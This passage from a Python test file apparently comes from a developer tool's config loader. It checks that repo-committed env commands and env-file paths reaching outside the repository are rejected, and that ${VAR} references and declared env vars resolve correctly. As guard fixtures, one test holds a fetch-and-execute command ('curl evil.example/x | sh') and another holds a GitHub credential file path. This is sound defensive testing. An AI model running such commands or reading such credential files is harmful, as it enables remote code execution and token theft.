        "\\\\host\\share\\secrets.env",
    ],
)
def test_env_file_is_contained_rejects_escapes(raw: str) -> None:
    """Absolute (POSIX, Windows drive, UNC), home-relative, and anything whose
    normalized form walks above the root."""
    assert ContainerConfig.env_file_is_contained(raw) is False


# ─── the same env-source guards, on the tickets section ─────────────────────
#
# `tickets` is the second `EnvSourceConfig` consumer, and the point of the base
# class is that neither guard was re-argued for it: the trust question ("what
# does this let a committed layer REACH") is a property of the mechanism, not of
# the feature. These pin that the inheritance actually wires both pre-passes,
# because a section registered in one and forgotten in the other is a hole that
# looks exactly like a working boundary.


def test_tickets_single_layer_setting_both_env_sources_raises(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"tickets": {"env_file": ".grove/tickets.env", "env_command": "print-env"}},
    )
    with pytest.raises(ConfigError) as excinfo:
        load_config(tmp_repo, env={})
    assert "tickets:" in str(excinfo.value)
    assert "mutually exclusive" in str(excinfo.value)


def test_tickets_local_env_command_wins_the_whole_group(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """Cross-layer exclusivity, so a project file plus a machine-local command
    cannot merge into a config holding both."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"tickets": {"env_file": ".grove/tickets.env"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"tickets": {"env_command": "secrets-cli export"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.tickets.env_command == "secrets-cli export"
    assert cfg.tickets.env_file is None


def test_committed_tickets_env_command_is_dropped_with_a_warning(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    """Same RCE-on-clone reasoning as the container section: a repo may not run a
    host command by shipping a config file."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"tickets": {"env_command": "curl evil.example/x | sh"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.tickets.env_command is None
    assert any("tickets.env_command" in msg for msg in warnings_logged)


def test_committed_tickets_env_file_outside_the_repo_is_dropped(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"tickets": {"env_file": "~/.config/gh/hosts.yml"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.tickets.env_file is None
    assert any("tickets.env_file" in msg for msg in warnings_logged)


def test_committed_repo_relative_tickets_env_file_is_honoured(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """The team convention this feature exists for, committed once per repo."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"tickets": {"env_file": ".grove/tickets.env"}},
    )
    assert load_config(tmp_repo, env={}).tickets.env_file == ".grove/tickets.env"


def test_committed_env_sources_are_stripped_per_section_independently(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """One committed layer touching BOTH sections: the loop must not stop at the
    first section it edits, which is the shape a single-section guard degrades to
    when a second consumer is added."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {
            "container": {"env_command": "print-env", "docker_bin": "podman"},
            "tickets": {"env_command": "print-env", "gitea": {"enabled": True}},
        },
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_command is None
    assert cfg.tickets.env_command is None
    assert cfg.container.docker_bin == "podman"
    assert cfg.tickets.gitea.enabled is True


# ─── ${VAR} references in string values ─────────────────────────────────────


def test_env_reference_resolves_in_a_nested_section(tmp_state_dir: Path) -> None:
    """The motivating case: a Gotify base URL named by a variable of the user's
    own choosing, end to end through the real loader."""
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"notifications": {"gotify": {"enabled": True, "server_url": "${MY_GOTIFY_URL}"}}},
    )
    cfg = load_config(None, env={"MY_GOTIFY_URL": "https://push.example.com"})
    assert cfg.notifications.gotify.server_url == "https://push.example.com"


def test_env_reference_embeds_in_a_larger_string() -> None:
    resolved = EnvReferences.resolve(
        {"notifications": {"gotify": {"server_url": "http://${HOST}:${PORT}/push"}}},
        {"HOST": "gotify.internal", "PORT": "8080"},
    )
    assert resolved["notifications"]["gotify"]["server_url"] == "http://gotify.internal:8080/push"


def test_env_reference_resolves_inside_list_elements(tmp_state_dir: Path) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"agents": [{"name": "pinned", "command": "run", "env_unset": ["${LEAKY_VAR}", "OTHER"]}]},
    )
    cfg = load_config(None, env={"LEAKY_VAR": "CLAUDE_CONFIG_DIR"})
    spec = cfg.find_agent("pinned")
    assert spec is not None
    assert spec.env_unset == ("CLAUDE_CONFIG_DIR", "OTHER")


def test_env_reference_escape_yields_a_literal() -> None:
    resolved = EnvReferences.resolve({"worktree": {"branch_prefix": "$${NOT_A_VAR}/"}}, {})
    assert resolved["worktree"]["branch_prefix"] == "${NOT_A_VAR}/"


def test_env_reference_leaves_unbraced_dollar_text_alone() -> None:
    """Not shell interpolation: a bare `$` and `$FOO` are ordinary characters."""
    resolved = EnvReferences.resolve({"worktree": {"branch_prefix": "$FOO-$-"}}, {"FOO": "x"})
    assert resolved["worktree"]["branch_prefix"] == "$FOO-$-"


def test_env_reference_never_rewrites_a_key() -> None:
    resolved = EnvReferences.resolve({"agents": {"${NAME}": "value"}}, {"NAME": "claude"})
    assert list(resolved["agents"]) == ["${NAME}"]


def test_env_reference_leaves_repo_placeholders_for_expand_template() -> None:
    """`${repo}`/`${repo_name}` belong to a later expansion against a concrete
    repository — consuming them here would break every path template."""
    resolved = EnvReferences.resolve({"worktree": {"root_template": "${repo}/.worktrees"}}, {})
    assert resolved["worktree"]["root_template"] == "${repo}/.worktrees"


def test_env_reference_to_an_unset_variable_is_loud(tmp_state_dir: Path) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"notifications": {"gotify": {"server_url": "${MISSING_GOTIFY_URL}"}}},
    )
    with pytest.raises(ConfigError) as excinfo:
        load_config(None, env={})
    message = str(excinfo.value)
    assert "MISSING_GOTIFY_URL" in message
    assert "notifications.gotify.server_url" in message
    assert "not set" in message


def test_env_reference_to_an_empty_variable_is_loud(tmp_state_dir: Path) -> None:
    """Empty reads as absent for the implicit GROVE_* layer; an explicit
    reference must not inherit that rule — an empty base URL loads fine and then
    sends nowhere."""
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"notifications": {"gotify": {"server_url": "${BLANK_GOTIFY_URL}"}}},
    )
    with pytest.raises(ConfigError) as excinfo:
        load_config(None, env={"BLANK_GOTIFY_URL": ""})
    assert "BLANK_GOTIFY_URL" in str(excinfo.value)
    assert "is empty" in str(excinfo.value)


def test_resolved_value_still_passes_through_field_validation(tmp_state_dir: Path) -> None:
    """Resolution runs BEFORE model_validate, so a bad resolved value is rejected
    exactly like a bad literal."""
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"agents": [{"name": "pinned", "command": "run", "kind": "${MY_AGENT_KIND}"}]},
    )
    assert load_config(None, env={"MY_AGENT_KIND": "codex"}).find_agent("pinned").kind == "codex"  # type: ignore[union-attr]
    with pytest.raises(ConfigError):
        load_config(None, env={"MY_AGENT_KIND": "not-a-kind"})


def test_env_reference_leaves_token_env_fields_alone(tmp_state_dir: Path) -> None:
    """`*_env` fields hold a variable NAME by design. They are not references and
    must never be resolved into the secret they point at."""
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"notifications": {"gotify": {"token_env": "MY_GOTIFY_TOKEN"}}},
    )
    cfg = load_config(None, env={"MY_GOTIFY_TOKEN": "Asecret"})
    assert cfg.notifications.gotify.token_env == "MY_GOTIFY_TOKEN"


def test_grove_env_override_layer_is_undisturbed(tmp_state_dir: Path) -> None:
    """The implicit `GROVE_<SECTION>__<FIELD>` layer is a separate mechanism and
    keeps working — including when its own value carries a reference."""
    del tmp_state_dir
    cfg = load_config(
        None,
        env={
            "GROVE_NOTIFICATIONS__GOTIFY__SERVER_URL": "https://direct.example.com",
            "GROVE_WORKTREE__BRANCH_PREFIX": "${MY_PREFIX}/",
            "MY_PREFIX": "team",
        },
    )
    assert cfg.notifications.gotify.server_url == "https://direct.example.com"
    assert cfg.worktree.branch_prefix == "team/"


# ─── per-field declared env vars ────────────────────────────────────────────


def test_declared_env_var_overrides_the_file_value(tmp_state_dir: Path) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {
            "notifications": {"gotify": {"server_url": "https://from-file"}},
            "tickets": {"gitea": {"base_url": "https://gitea-from-file"}},
        },
    )
    cfg = load_config(
        None,
        env={
            "GROVE_GOTIFY_API_URL": "https://from-declared",
            "GROVE_GITEA_BASE_URL": "https://gitea-from-declared",
        },
    )
    assert cfg.notifications.gotify.server_url == "https://from-declared"
    assert cfg.tickets.gitea.base_url == "https://gitea-from-declared"


def test_declared_env_var_loses_to_the_schema_path_layer(tmp_state_dir: Path) -> None:
    """The schema-path name states the exact field it fills; the declared name is
    a convenience alias, so the unambiguous one wins."""
    del tmp_state_dir
    cfg = load_config(
        None,
        env={
            "GROVE_GOTIFY_API_URL": "https://from-declared",
            "GROVE_NOTIFICATIONS__GOTIFY__SERVER_URL": "https://from-path",
            "GROVE_GITEA_BASE_URL": "https://gitea-from-declared",
            "GROVE_TICKETS__GITEA__BASE_URL": "https://gitea-from-path",
        },
    )
    assert cfg.notifications.gotify.server_url == "https://from-path"
    assert cfg.tickets.gitea.base_url == "https://gitea-from-path"


def test_declared_env_var_beats_a_reference_written_in_the_file(tmp_state_dir: Path) -> None:
    """Level 2 vs level 3: a `${VAR}` reference IS the file's value, and the
    declared variable overrides the file."""
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"notifications": {"gotify": {"server_url": "${MY_GOTIFY_URL}"}}},
    )
    env = {"MY_GOTIFY_URL": "https://from-reference"}
    assert load_config(None, env=env).notifications.gotify.server_url == "https://from-reference"
    cfg = load_config(None, env={**env, "GROVE_GOTIFY_API_URL": "https://from-declared"})
    assert cfg.notifications.gotify.server_url == "https://from-declared"


def test_unset_declared_env_var_is_not_an_override(tmp_state_dir: Path) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {"tickets": {"gitea": {"base_url": "https://gitea-from-file"}}},
    )
    assert load_config(None, env={}).tickets.gitea.base_url == "https://gitea-from-file"


def test_empty_declared_env_var_is_not_an_override(tmp_state_dir: Path) -> None:
    """The asymmetry that is NOT an inconsistency: an exported-but-blank variable
    is how a shell says nothing, and nobody opted into this mechanism — where an
    empty `${VAR}` reference, typed on purpose, is an error."""
    del tmp_state_dir
    _write_layer(
        paths_mod.user_config_path(),
        {
            "notifications": {"gotify": {"server_url": "https://from-file"}},
            "tickets": {"gitea": {"base_url": "https://gitea-from-file"}},
        },
    )
    cfg = load_config(None, env={"GROVE_GOTIFY_API_URL": "", "GROVE_GITEA_BASE_URL": ""})
    assert cfg.notifications.gotify.server_url == "https://from-file"
    assert cfg.tickets.gitea.base_url == "https://gitea-from-file"


def test_declared_env_var_layer_is_sparse() -> None:
    """It names only the fields the environment actually supplies, so it can never
    mention a field nobody set."""
    assert DeclaredEnvVars.layer(GroveConfig, {}) == {}
    assert DeclaredEnvVars.layer(GroveConfig, {"GROVE_GOTIFY_API_URL": "https://x"}) == {
        "notifications": {"gotify": {"server_url": "https://x"}}
    }


def test_declared_env_vars_are_exported_on_the_schema() -> None:
    """The schema is the census — a declaration lands in the published reference
    instead of being a private os.environ read."""
    schema = json.loads(dump_schema_json())
    defs = schema["$defs"]
    assert (
        defs["GotifyChannelConfig"]["properties"]["server_url"]["x-env-var"]
        == "GROVE_GOTIFY_API_URL"
    )
    assert (
        defs["GiteaTicketConfig"]["properties"]["base_url"]["x-env-var"] == "GROVE_GITEA_BASE_URL"
    )


def test_no_secret_field_declares_an_env_var() -> None:
    """A credential travels through a `*_env` field, which names the variable the
    consumer reads at the moment of use. Declaring one on such a field would put
    the secret into the config object itself."""
    declared = _declared_paths(GroveConfig, prefix="")
    assert declared == {
        "notifications.gotify.server_url": "GROVE_GOTIFY_API_URL",
        "tickets.gitea.base_url": "GROVE_GITEA_BASE_URL",
    }
    assert not [path for path in declared if path.rsplit(".", 1)[-1].endswith("_env")]


def _declared_paths(model: type[BaseModel], *, prefix: str) -> dict[str, str]:
    """Every declared variable in the model tree, keyed by dotted config path."""
    found: dict[str, str] = {}
    for name, field in model.model_fields.items():
        annotation = field.annotation
        if isinstance(annotation, type) and issubclass(annotation, BaseModel):
            found.update(_declared_paths(annotation, prefix=f"{prefix}{name}."))
            continue
        variable = DeclaredEnvVars.declared(field)
        if variable:
            found[f"{prefix}{name}"] = variable
    return found
